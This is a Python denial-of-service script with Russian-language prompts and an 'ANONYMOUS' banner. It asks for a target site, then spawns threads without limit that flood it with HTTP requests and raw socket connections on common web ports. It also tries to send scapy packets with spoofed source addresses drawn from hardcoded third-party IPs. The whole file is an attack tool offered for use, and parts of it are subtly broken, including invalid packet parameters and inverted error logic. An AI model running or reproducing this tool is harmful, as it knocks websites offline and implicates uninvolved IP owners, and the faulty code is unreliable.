import random
import socket
import threading
import time
import os,sys
from secrets import choice
from threading import Thread
import psutil
os.system("clear")
print("З А Г Р У З К А....")
time.sleep(2.5)
os.system("clear")

#########Terminal colors################
red = "\033[1;31m"
blue = "\033[1;34m"
green = "\033[1;32m"
yellow = "\033[1;33m"
white = "\033[1;37m"
default = "\033[0m"

print("""\033[93m
     __      ANONYMOUS       _____
    / /  __ _ _   _  ___ _  |___  |
   / /  / _` | | | |/ _ \ '__| / /
  / /__| (_| | |_| |  __/ |   / /
  \____/\__,_|\__, |\___|_|  /_/
              |___/
  ADDED NEW METHOD AND BYPASS 
""")
print("Ddos@Attaka")

import threading
from random import choice
import requests
import socket

print()
#########################################################################
#ip
url = input("\033[94m╔═══\033[91m[ Url ] •\n\033[94m╠══>\033[0m ")
url_chek =requests.get(url)
ip = socket.gethostbyname(url.replace("https://","").replace("http://",""))
print(ip)
print()

try:
    from scapy.all import *
    from scapy.layers.inet import TCP, IP
    is_erroring = True
except:
    pass


ips = ['217.160.0.137', '212.164.222.45', '176.59.131.203']

if input('Вы уже знаете IP адрес сайта? (y/n) ') == 'n':
    url = input('Введите адрес сайта(без https:// и http://): ')
    target = socket.gethostbyname(url)
else:
    target = input('Введите IP сайта: => ')

if input('Вы хотите ввести чужой IP для DDoS с него? (y/n) ') == 'y':
    user_ip = input('Введите IP: => ')
    ips.append(user_ip)

target2 = input('Введите адрес сайта(с https:// или http://): => ')
input('Enter начало атаки')

ports = ['80','443','8000','8080']
attack_num = 0
port = 0


def dos():
    while True:
        try:
            requests.get(target2)
            requests.post(target2)

            global attack_num, port
            attack_num += 1

            ip = choice(ips)
            port = int(choice(ports))

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + ip + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()
            i = 1

            if not is_erroring:
                while True:
                    IP1 = IP(source_IP=choice(ips), destination=target)
                    TCP1 = TCP(srcport=choice(ips), dstport=80)
                    pkt = IP1 / TCP1
                    send(pkt, inter=.001)
        except Exception as error:
            threading.Thread(target=dos).start()
            print(error)
            break


while True:
    threading.Thread(target=dos).start()
    print(f'Numbers of attack: {attack_num}')
    print(f'Send ping to {target}:{port}')
